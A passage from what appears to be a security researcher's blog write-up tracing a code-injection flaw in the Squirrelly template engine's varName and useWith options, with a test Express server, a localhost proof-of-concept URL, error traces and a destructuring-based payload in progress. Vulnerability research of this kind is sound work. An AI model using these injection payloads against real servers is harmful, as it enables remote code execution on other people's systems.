<span data-line=""><span style="color:#CDD6F4">    (env</span><span style="color:#94E2D5">.</span><span style="color:#CDD6F4">useWith </span><span style="color:#94E2D5">?</span><span style="color:#A6E3A1"> 'with('</span><span style="color:#94E2D5"> +</span><span style="color:#CDD6F4"> env</span><span style="color:#94E2D5">.</span><span style="color:#CDD6F4">varName </span><span style="color:#94E2D5">+</span><span style="color:#A6E3A1"> '||{}){'</span><span style="color:#94E2D5"> :</span><span style="color:#A6E3A1"> ''</span><span style="color:#CDD6F4">) </span><span style="color:#94E2D5">+</span></span>
<span data-line=""><span style="color:#89B4FA;font-style:italic">    compileScope</span><span style="color:#CDD6F4">(buffer</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> env) </span><span style="color:#94E2D5">+</span></span>
<span data-line=""><span style="color:#A6E3A1">    'if(cb){cb(null,tR)} return tR'</span><span style="color:#94E2D5"> +</span></span>
<span data-line=""><span style="color:#CDD6F4">    (env</span><span style="color:#94E2D5">.</span><span style="color:#CDD6F4">useWith </span><span style="color:#94E2D5">?</span><span style="color:#A6E3A1"> '}'</span><span style="color:#94E2D5"> :</span><span style="color:#A6E3A1"> ''</span><span style="color:#CDD6F4">)</span></span></code></pre></figure><p>(<span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>env</span></span></code></span> is the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>options</span></span></code></span> parameter passed to the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>render</span></span></code></span> function)</p><p>After following the complete function call chain (<span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>render -> handleCache -> compile -> compileString</span></span></code></span>), I found that the
<span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>env.varName</span></span></code></span> parameter is indeed not sanitized. At first glance, this seems like an easy way to inject arbitrary JS and
get RCE server-side. In order to get this exploit to work, the attacker should set <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>env.useWith</span></span></code></span> so that <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>env.varName</span></span></code></span>
is injected.</p><p>The <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>with</span></span></code></span> expression is an almost-deprecated Javascript feature that allows you to execute a block of code, appending
an object to the global scope chain. This is demonstrated below:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">with</span><span style="color:#CDD6F4"> (</span><span style="color:#A6E3A1">"asdf"</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">{</span></span>
<span data-line=""><span style="color:#CDD6F4">    console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(</span><span style="color:#89B4FA;font-style:italic">toString</span><span style="color:#CDD6F4">()) </span><span style="color:#6C7086;font-style:italic">// logs "asdf"</span></span>
<span data-line=""><span style="color:#9399B2">}</span></span></code></pre></figure><p>However, what is important is that we can inject an arbitrary expression into the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>with</span></span></code></span> argument. This can easily allow
us to get RCE! A simple payload would be:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#6C7086;font-style:italic">// options.varName = 'console.log("x")'</span></span>
<span data-line=""><span style="color:#CBA6F7">with</span><span style="color:#CDD6F4"> (console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"x"</span><span style="color:#CDD6F4">) </span><span style="color:#94E2D5">||</span><span style="color:#9399B2"> {}</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">{</span></span>
<span data-line=""><span style="color:#6C7086;font-style:italic">    // ...</span></span>
<span data-line=""><span style="color:#9399B2">}</span></span></code></pre></figure><p>This should execute the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>console.log("x")</span></span></code></span> statement and give us RCE.</p></section><section><h2 id="testing">Testing</h2><p>We can set up a simple server to test this out.</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#CDD6F4"> express </span><span style="color:#94E2D5">=</span><span style="color:#89B4FA;font-style:italic"> require</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"express"</span><span style="color:#CDD6F4">)</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#CDD6F4"> PORT </span><span style="color:#94E2D5">=</span><span style="color:#FAB387"> 3000</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#CDD6F4"> app </span><span style="color:#94E2D5">=</span><span style="color:#89B4FA;font-style:italic"> express</span><span style="color:#CDD6F4">()</span></span>
<span data-line=""><span style="color:#CDD6F4">app</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">set</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"view engine"</span><span style="color:#9399B2">,</span><span style="color:#A6E3A1"> "squirrelly"</span><span style="color:#CDD6F4">)</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#CDD6F4">app</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">get</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"/"</span><span style="color:#9399B2">,</span><span style="color:#9399B2"> (</span><span style="color:#EBA0AC;font-style:italic">req</span><span style="color:#9399B2">,</span><span style="color:#EBA0AC;font-style:italic"> res</span><span style="color:#9399B2">)</span><span style="color:#CBA6F7"> =></span><span style="color:#9399B2"> {</span></span>
<span data-line=""><span style="color:#CDD6F4">  res</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">render</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"asdf"</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> req</span><span style="color:#94E2D5">.</span><span style="color:#CDD6F4">query)</span></span>
<span data-line=""><span style="color:#9399B2">}</span><span style="color:#CDD6F4">)</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#CDD6F4">app</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">listen</span><span style="color:#CDD6F4">(</span><span style="color:#FAB387">3000</span><span style="color:#9399B2">,</span><span style="color:#9399B2"> ()</span><span style="color:#CBA6F7"> =></span><span style="color:#9399B2"> {</span></span>
<span data-line=""><span style="color:#CDD6F4">  console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">`Server is running at port </span><span style="color:#9399B2">${</span><span style="color:#CDD6F4">PORT</span><span style="color:#9399B2">}</span><span style="color:#A6E3A1">`</span><span style="color:#CDD6F4">)</span></span>
<span data-line=""><span style="color:#9399B2">}</span><span style="color:#CDD6F4">)</span></span></code></pre></figure><p>Visiting the following URL to execute our payload:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="plaintext" data-theme="catppuccin-mocha"><code data-language="plaintext" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span>http://localhost:3000?useWith=1&#x26;varName=console.log("x")</span></span></code></pre></figure><p>However, if we try to do this, we get the following error:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="plaintext" data-theme="catppuccin-mocha"><code data-language="plaintext" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span>Squirrelly Error: Bad template syntax</span></span>
<span data-line=""> </span>
<span data-line=""><span>Arg string terminates parameters early</span></span>
<span data-line=""><span>======================================</span></span>
<span data-line=""><span>var tR='';tR+='asdf\n';if(cb){cb(null,tR)} return tR</span></span>
<span data-line=""><span>    at SqrlErr (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:138:15)</span></span>
<span data-line=""><span>    at compile (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:881:19)</span></span>
<span data-line=""><span>    at handleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1002:12)</span></span>
<span data-line=""><span>    at tryHandleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1035:13)</span></span>
<span data-line=""><span>    at View.renderFile [as engine] (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1064:12)</span></span>
<span data-line=""><span>    at View.render (/home/samuzora/test/node_modules/express/lib/view.js:135:8)</span></span>
<span data-line=""><span>    at tryRender (/home/samuzora/test/node_modules/express/lib/application.js:657:10)</span></span>
<span data-line=""><span>    at Function.render (/home/samuzora/test/node_modules/express/lib/application.js:609:3)</span></span>
<span data-line=""><span>    at ServerResponse.render (/home/samuzora/test/node_modules/express/lib/response.js:1048:7)</span></span>
<span data-line=""><span>    at /home/samuzora/test/index.js:9:7</span></span></code></pre></figure><p>What does this mean? Searching for the error message, we can see the error being raised at
<a href="https://github.com/squirrellyjs/squirrelly/blob/5eae86154a03d0716c2525ab9e50d9adb318abe6/src/compile.ts#L44"><span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>src/compile.ts:44</span></span></code></span></a>:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">  try</span><span style="color:#9399B2"> {</span></span>
<span data-line=""><span style="color:#CBA6F7">    return</span><span style="color:#CBA6F7;font-weight:bold"> new</span><span style="color:#89B4FA;font-style:italic"> ctor</span><span style="color:#CDD6F4">(</span></span>
<span data-line=""><span style="color:#CDD6F4">      options</span><span style="color:#94E2D5">.</span><span style="color:#CDD6F4">varName</span><span style="color:#9399B2">,</span></span>
<span data-line=""><span style="color:#A6E3A1">      'c'</span><span style="color:#9399B2">,</span><span style="color:#6C7086;font-style:italic"> // SqrlConfig</span></span>
<span data-line=""><span style="color:#A6E3A1">      'cb'</span><span style="color:#9399B2">,</span><span style="color:#6C7086;font-style:italic"> // optional callback</span></span>
<span data-line=""><span style="color:#89B4FA;font-style:italic">      compileToString</span><span style="color:#CDD6F4">(str</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> options)</span></span>
<span data-line=""><span style="color:#CDD6F4">    ) </span><span style="color:#CBA6F7">as</span><span style="color:#F9E2AF;font-style:italic"> TemplateFunction</span><span style="color:#6C7086;font-style:italic"> // eslint-disable-line no-new-func</span></span>
<span data-line=""><span style="color:#9399B2">  }</span><span style="color:#CBA6F7"> catch</span><span style="color:#CDD6F4"> (e) </span><span style="color:#9399B2">{</span></span>
<span data-line=""><span style="color:#CBA6F7">    if</span><span style="color:#CDD6F4"> (e </span><span style="color:#CBA6F7">instanceof</span><span style="color:#F9E2AF;font-style:italic"> SyntaxError</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">{</span></span>
<span data-line=""><span style="color:#CBA6F7">      throw</span><span style="color:#89B4FA;font-style:italic"> SqrlErr</span><span style="color:#CDD6F4">(</span></span>
<span data-line=""><span style="color:#A6E3A1">        'Bad template syntax</span><span style="color:#F5C2E7">\n\n</span><span style="color:#A6E3A1">'</span><span style="color:#94E2D5"> +</span></span>
<span data-line=""><span style="color:#CDD6F4">          e</span><span style="color:#94E2D5">.</span><span style="color:#CDD6F4">message </span><span style="color:#94E2D5">+</span></span>
<span data-line=""><span style="color:#A6E3A1">          '</span><span style="color:#F5C2E7">\n</span><span style="color:#A6E3A1">'</span><span style="color:#94E2D5"> +</span></span>
<span data-line=""><span style="color:#89B4FA;font-style:italic">          Array</span><span style="color:#CDD6F4">(e</span><span style="color:#94E2D5">.</span><span style="color:#CDD6F4">message</span><span style="color:#94E2D5">.</span><span style="color:#CDD6F4">length </span><span style="color:#94E2D5">+</span><span style="color:#FAB387"> 1</span><span style="color:#CDD6F4">)</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">join</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">'='</span><span style="color:#CDD6F4">) </span><span style="color:#94E2D5">+</span></span>
<span data-line=""><span style="color:#A6E3A1">          '</span><span style="color:#F5C2E7">\n</span><span style="color:#A6E3A1">'</span><span style="color:#94E2D5"> +</span></span>
<span data-line=""><span style="color:#89B4FA;font-style:italic">          compileToString</span><span style="color:#CDD6F4">(str</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> options)</span></span>
<span data-line=""><span style="color:#CDD6F4">      )</span></span>
<span data-line=""><span style="color:#9399B2">  }</span><span style="color:#CBA6F7"> else</span><span style="color:#9399B2"> {</span></span>
<span data-line=""><span style="color:#CBA6F7">      throw</span><span style="color:#CDD6F4"> e</span></span>
<span data-line=""><span style="color:#9399B2">  }</span></span></code></pre></figure><p>The <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>options.varName</span></span></code></span> parameter is being passed to the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>ctor</span></span></code></span> function (which is just a <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>Function</span></span></code></span> constructor). The
<span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>Function</span></span></code></span> constructor takes in <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>n+1</span></span></code></span> arguments, where the first <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>n</span></span></code></span> arguments are parameters of the function to be
created, and the last argument is the function body. That’s what’s causing our error, since we’re passing
<span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>console.log("x")</span></span></code></span> into the parameter field. This means our injection occurs in the first parameter of the new function
being created, and should be a valid JS expression that can be passed in a parameter declaration. And our payload should
still execute as per normal in the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>with</span></span></code></span> expression.</p></section><section><h2 id="first-payload">First payload</h2><p>Javascript allows for parameters to be destructured in the function definition like so:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">function</span><span style="color:#89B4FA;font-style:italic"> f</span><span style="color:#9399B2">({</span><span style="color:#EBA0AC;font-style:italic"> a</span><span style="color:#9399B2"> })</span><span style="color:#9399B2"> {</span></span>
<span data-line=""><span style="color:#CDD6F4">    console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(a)</span></span>
<span data-line=""><span style="color:#6C7086;font-style:italic">    // ...</span></span>
<span data-line=""><span style="color:#9399B2">}</span></span></code></pre></figure><p>This is done through object destructuring. It’s quite flexible and also allows for default values to be set:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">function</span><span style="color:#89B4FA;font-style:italic"> f</span><span style="color:#9399B2">({</span><span style="color:#EBA0AC;font-style:italic"> a</span><span style="color:#94E2D5"> =</span><span style="color:#FAB387"> 1</span><span style="color:#9399B2"> })</span><span style="color:#9399B2"> {</span></span>
<span data-line=""><span style="color:#CDD6F4">    console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(a)</span></span>
<span data-line=""><span style="color:#9399B2">}</span></span></code></pre></figure><p>This is the vector for our RCE. When setting the default value, the expression has to be evaluated, which we can use for
RCE. Something like this should work:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">function</span><span style="color:#89B4FA;font-style:italic"> f</span><span style="color:#9399B2">({</span><span style="color:#EBA0AC;font-style:italic"> a</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"x"</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">})</span><span style="color:#9399B2"> {</span></span>
<span data-line=""><span style="color:#CDD6F4">    console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(a)</span></span>
<span data-line=""><span style="color:#9399B2">}</span></span></code></pre></figure><p>However, there’s a small problem - our payload is also being injected in the <span data-rehype-pretty-code-figure=""><code data-language="plaintext" data-theme="catppuccin-mocha" style="background-color:#1e1e2e;color:#cdd6f4"><span data-line=""><span>with</span></span></code></span> expression, and this syntax is
invalid there since it’s not a valid object initializer.</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">with</span><span style="color:#CDD6F4"> (</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> a </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> console</span><span style="color:#94E2D5">.</span><span style="color:#89B4FA;font-style:italic">log</span><span style="color:#CDD6F4">(</span><span style="color:#A6E3A1">"x"</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> ||</span><span style="color:#9399B2"> {}</span><span style="color:#CDD6F4">) </span><span style="color:#9399B2">{</span></span>
<span data-line=""><span style="color:#6C7086;font-style:italic">    // ...</span></span>
<span data-line=""><span style="color:#9399B2">}</span></span></code></pre></figure><p>Indeed, when we try this payload, it crashes as well:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="plaintext" data-theme="catppuccin-mocha"><code data-language="plaintext" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span>Squirrelly Error: Bad template syntax</span></span>
<span data-line=""> </span>
<span data-line=""><span>Invalid shorthand property initializer</span></span>
<span data-line=""><span>======================================</span></span>
<span data-line=""><span>var tR='';with({a=console.log("X")}||{}){tR+='asdf\n';if(cb){cb(null,tR)} return tR}</span></span>
<span data-line=""><span>    at SqrlErr (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:138:15)</span></span>
<span data-line=""><span>    at compile (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:881:19)</span></span>
<span data-line=""><span>    at handleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1002:12)</span></span>
<span data-line=""><span>    at tryHandleCache (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1035:13)</span></span>
<span data-line=""><span>    at View.renderFile [as engine] (/home/samuzora/test/node_modules/squirrelly/dist/squirrelly.cjs.js:1064:12)</span></span>
<span data-line=""><span>    at View.render (/home/samuzora/test/node_modules/express/lib/view.js:135:8)</span></span>
<span data-line=""><span>    at tryRender (/home/samuzora/test/node_modules/express/lib/application.js:657:10)</span></span>
<span data-line=""><span>    at Function.render (/home/samuzora/test/node_modules/express/lib/application.js:609:3)</span></span>
<span data-line=""><span>    at ServerResponse.render (/home/samuzora/test/node_modules/express/lib/response.js:1048:7)</span></span>
<span data-line=""><span>    at /home/samuzora/test/index.js:9:7</span></span></code></pre></figure><p>Luckily, according to the
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment">docs</a>, the destructuring syntax is quite flexible and allows for a lot more kinds of syntax:</p><figure data-rehype-pretty-code-figure=""><pre style="background-color:#1e1e2e;color:#cdd6f4" tabindex="0" data-language="javascript" data-theme="catppuccin-mocha"><code data-language="javascript" data-theme="catppuccin-mocha" style="display: grid;"><span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> [</span><span style="color:#CDD6F4">a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">]</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> [</span><span style="color:#CDD6F4">a</span><span style="color:#9399B2">,</span><span style="color:#9399B2"> ,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">]</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> [</span><span style="color:#CDD6F4">a </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> aDefault</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">]</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> [</span><span style="color:#CDD6F4">a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">rest</span><span style="color:#9399B2">]</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> [</span><span style="color:#CDD6F4">a</span><span style="color:#9399B2">,</span><span style="color:#9399B2"> ,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">rest</span><span style="color:#9399B2">]</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> [</span><span style="color:#CDD6F4">a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#9399B2">{</span><span style="color:#CDD6F4"> pop</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> push </span><span style="color:#9399B2">}]</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> [</span><span style="color:#CDD6F4">a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#9399B2">[</span><span style="color:#CDD6F4">c</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> d</span><span style="color:#9399B2">]]</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> {</span><span style="color:#CDD6F4"> a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> {</span><span style="color:#CDD6F4"> a</span><span style="color:#9399B2">:</span><span style="color:#CDD6F4"> a1</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">:</span><span style="color:#CDD6F4"> b1 </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> {</span><span style="color:#CDD6F4"> a</span><span style="color:#9399B2">:</span><span style="color:#CDD6F4"> a1 </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> aDefault</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> bDefault </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> {</span><span style="color:#CDD6F4"> a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">rest </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> {</span><span style="color:#CDD6F4"> a</span><span style="color:#9399B2">:</span><span style="color:#CDD6F4"> a1</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">:</span><span style="color:#CDD6F4"> b1</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">rest </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CBA6F7">const</span><span style="color:#9399B2"> {</span><span style="color:#CDD6F4"> [key]</span><span style="color:#9399B2">:</span><span style="color:#CDD6F4"> a </span><span style="color:#9399B2">}</span><span style="color:#94E2D5"> =</span><span style="color:#CDD6F4"> obj</span><span style="color:#9399B2">;</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color:#CBA6F7">let</span><span style="color:#CDD6F4"> a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> a1</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b1</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> c</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> d</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> rest</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> pop</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> push</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">[a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b] </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">[a</span><span style="color:#9399B2">,</span><span style="color:#9399B2"> ,</span><span style="color:#CDD6F4"> b] </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">[a </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> aDefault</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b] </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
<span data-line=""><span style="color:#CDD6F4">[a</span><span style="color:#9399B2">,</span><span style="color:#CDD6F4"> b</span><span style="color:#9399B2">,</span><span style="color:#94E2D5"> ...</span><span style="color:#CDD6F4">rest] </span><span style="color:#94E2D5">=</span><span style="color:#CDD6F4"> array</span><span style="color:#9399B2">;</span></span>
